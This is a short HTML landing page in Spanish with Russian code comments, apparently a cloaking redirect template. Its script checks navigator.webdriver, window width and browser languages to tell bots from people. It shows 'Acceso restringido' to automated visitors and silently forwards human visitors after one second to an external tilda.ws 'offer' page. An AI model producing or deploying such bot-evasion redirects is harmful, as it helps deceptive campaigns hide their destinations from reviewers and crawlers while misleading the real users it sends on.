<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Bienvenido</title>
  <script>
    // Антибот-защита (на примитивном уровне)
    const isHuman = () => {
      return navigator.webdriver === false && 
             window.innerWidth > 800 && 
             navigator.languages.length > 0;
    };

    const redirect = () => {
      // Укажи свой оффер ниже:
      const target = "http://argentinaforreal.tilda.ws/";
      window.location.href = target;
    };

    window.onload = () => {
      if (isHuman()) {
        setTimeout(redirect, 1000); // Задержка 1 секунда
      } else {
        document.body.innerHTML = "<h1>Acceso restringido</h1>";
      }
    };
  </script>
</head>
<body>
  <h2 style="text-align:center; margin-top:100px;">Cargando...</h2>
</body>
</html>
